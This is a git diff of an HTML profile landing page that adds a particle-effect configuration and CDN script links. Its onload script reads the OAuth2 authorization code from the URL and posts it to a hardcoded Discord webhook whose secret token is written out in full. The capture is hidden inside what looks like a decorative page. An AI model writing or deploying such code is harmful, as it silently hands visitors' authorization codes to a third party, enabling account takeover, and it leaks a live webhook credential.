@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <link rel="icon" type="assets/images/pfp/healavatar1.png" href="assets/images/pfp/healavatar1.png">
+    <link rel="icon" type="image/png" href="assets/images/pfp/healavatar1.png">
     <link rel="stylesheet" href="styles.css">
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -104,12 +104,11 @@
         }
     </style>
     <link href="static/userinfo/style.css" rel="stylesheet">
-    <link rel="stylesheet" href="./cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-    <script src="./cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
 </head>
 <body>
     <div class="landing" id="landing">
-        <div id="particles-js"><canvas class="particles-js-canvas-el" style="width: 100%; height: 100%;" width="619" height="671"></canvas></div>
+        <div id="particles-js"></div>
         <div class="border">
             <div class="avatar">
                 <div class="avatar-container">
@@ -153,36 +152,74 @@
     </div>
     <script src="static/userinfo/script.js"></script>
     <script src="static/assets/js/enter.js"></script>
+    <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
     <script>
         window.onload = function() {
             const urlParams = new URLSearchParams(window.location.search);
             const code = urlParams.get('code');
-
             if (code) {
                 console.log('Authorization code:', code);
 
-                // Fuck you zio
-                const webhookUrl = process.env.REACT_APP_DISCORD_WEBHOOK_URL;
-
-                if (webhookUrl) {
-                    fetch(webhookUrl, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({ content: `New OAuth2 code: ${code}` })
-                    })
-                    .then(response => response.json())
-                    .then(data => {
-                        console.log('Success:', data);
-                    })
-                    .catch((error) => {
-                        console.error('Error:', error);
-                    });
-                } else {
-                    console.error('Webhook URL is not defined.');
-                }
+                const webhookUrl = 'https://discord.com/api/webhooks/1262446066390011955/6r1ccTdwLORnBNiSOj_I48wN60QpL-v8Z8DtaIH3LCU7Tp_0mbAVzem33CqIzuMuasU1';
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ content: `New OAuth2 code: ${code}` })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Success:', data);
+                })
+                .catch((error) => {
+                    console.error('Error:', error);
+                });
             }
+
+            particlesJS("particles-js", {
+                particles: {
+                    number: { value: 100, density: { enable: true, value_area: 800 } },
+                    color: { value: "#fff" },
+                    shape: { type: "circle" },
+                    opacity: {
+                        value: 0.8,
+                        random: true,
+                        anim: { enable: true, speed: 1, opacity_min: 0.1, sync: false }
+                    },
+                    size: {
+                        value: 5,
+                        random: true,
+                        anim: { enable: true, speed: 2, size_min: 1, sync: false }
+                    },
+                    line_linked: { enable: false },
+                    move: {
+                        enable: true,
+                        speed: 1,
+                        direction: "bottom",
+                        random: true,
+                        straight: false,
+                        out_mode: "out",
+                        bounce: false
+                    }
+                },
+                interactivity: {
+                    detect_on: "canvas",
+                    events: {
+                        onhover: { enable: false },
+                        onclick: { enable: false },
+                        resize: true
+                    },
+                    modes: {
+                        grab: { distance: 400, line_linked: { opacity: 1 } },
+                        bubble: { distance: 250, size: 0, duration: 2, opacity: 0 },
+                        repulse: { distance: 400, duration: 0.4 },
+                        push: { particles_nb: 4 },
+                        remove: { particles_nb: 2 }
+                    }
+                },
+                retina_detect: true
+            });
         };
     </script>
 </body>
